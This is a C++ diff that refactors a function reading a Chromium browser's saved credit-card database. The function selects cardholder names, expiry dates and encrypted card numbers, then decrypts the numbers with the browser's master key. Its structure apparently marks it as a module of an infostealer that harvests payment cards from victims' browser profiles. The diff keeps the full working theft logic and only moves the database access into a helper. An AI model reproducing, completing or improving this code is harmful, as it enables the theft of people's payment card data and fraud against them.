@@ -27,24 +27,9 @@ void CCreditCards::execute(const fs::path &root, const std::string &name, const 
 }
 
 std::list<CreditCard> CCreditCards::getCreditCards(const fs::path &db_path) {
-    std::list<CreditCard> creditCardList;
-    sqlite3* db;
-    sqlite3_stmt* stmt;
-    int rc;
+    std::list<CreditCard> cards;
 
-    rc = sqlite3_open(db_path.string().c_str(), &db);
-    if (rc) {
-        return {};
-    }
-
-    const char* sql = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards ORDER BY use_count DESC";
-    rc = sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);
-    if (rc != SQLITE_OK) {
-        sqlite3_close(db);
-        return {};
-    }
-
-    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
+    SQLiteUtil::connectAndRead("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards ORDER BY use_count DESC", db_path, [this, &cards](sqlite3_stmt *stmt) {
         const unsigned char* name_on_card = sqlite3_column_text(stmt, 0);
         int expiration_month = sqlite3_column_int(stmt, 1);
         int expiration_year = sqlite3_column_int(stmt, 2);
@@ -65,17 +50,8 @@ std::list<CreditCard> CCreditCards::getCreditCards(const fs::path &db_path) {
         std::string decoded_card_number = ChromiumUtil::decryptData(card_number, master_key);
         creditCardRecord.card_number = decoded_card_number;
 
-        creditCardList.push_back(creditCardRecord);
-    }
+        cards.push_back(creditCardRecord);
+    });
 
-    // Проверка на ошибки
-    if (rc != SQLITE_DONE) {
-        std::cerr << "Execution failed: " << sqlite3_errmsg(db) << std::endl;
-    }
-
-    // Освобождение ресурсов
-    sqlite3_finalize(stmt);
-    sqlite3_close(db);
-
-    return creditCardList;
+    return cards;
 }
